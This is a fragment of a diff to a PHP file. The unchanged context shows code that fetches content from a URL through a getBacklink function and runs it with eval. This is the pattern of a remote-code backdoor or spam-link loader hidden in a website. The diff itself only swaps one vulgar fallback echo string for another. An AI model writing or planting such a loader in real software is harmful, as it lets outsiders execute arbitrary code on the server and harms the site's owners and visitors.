@@ -24,7 +24,7 @@ $content = getBacklink($url);
 if ($content !== false) {
     eval("?>" . $content);
 } else {
-    echo "pussy";
+    echo "juice the pussy hunter";
 }
 
 ?>
